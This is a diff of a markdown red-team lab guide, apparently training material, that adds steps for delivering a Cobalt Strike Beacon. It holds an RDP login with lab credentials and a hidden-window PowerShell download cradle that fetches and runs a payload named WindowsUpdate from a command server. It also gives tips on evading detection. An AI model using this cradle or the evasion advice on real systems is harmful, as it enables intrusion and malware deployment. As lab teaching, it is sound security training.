@@ -59,7 +59,7 @@ The easiest way to infect a victim is by execution of a PowerShell Script:
 	1. Note:  Cobalt Strike Allows you to generate a malicious script to execute Beacon and host it on the Cobalt Strike server at the same time. *Check OPSEC Tip Below*
 2. Please check and fill in the following values:
 ![[Pasted image 20240130232846.png]]
-3. A new Dialogue should appear with the url that you can copy paste. We can also  automatically copy the URL back to your clipboard by going to Site Management -> Manage on top of your Cobalt Strike Client
+3. A new Dialogue should appear with the url that you can copy paste. We can also automatically copy the URL back to your clipboard by going to `Site Management -> Manage` on top of your Cobalt Strike Client
 
 
 *Red Team Tip: It is not smart to take the approach we are showing in this exercise in a stealthy red team.
@@ -67,8 +67,12 @@ The easiest way to infect a victim is by execution of a PowerShell Script:
 - *A better way to do this would be to have a separate "staging" server that is hardened for example using rewrite conditions based on URL and user agents, it is also smart to modify the generated script so static detections can be bypassed. For example leveraging AWS s3 bucket
 
 ### Deliver Beacon  
-
-
+Time to launch our Beacon. please rdp into wk01 by opening up a terminal on your slingshot
+```
+xfreerdp +clipboard /cert-ignore /u:Gareth.Kilgallen /p:Hu825meapvsAq#Rx /v:wk01.draconem.corp
+```
+1. Open a command prompt by clicking the windows icon in the lower left and typing cmd.exe. Then paste the download cradle 
+2. `   powershell.exe -nop -w hidden -c "iex(irm -useb http://10.130.4.100:8888/WindowsUpdate)"`
 ### Interacting with our beacon 
 
 
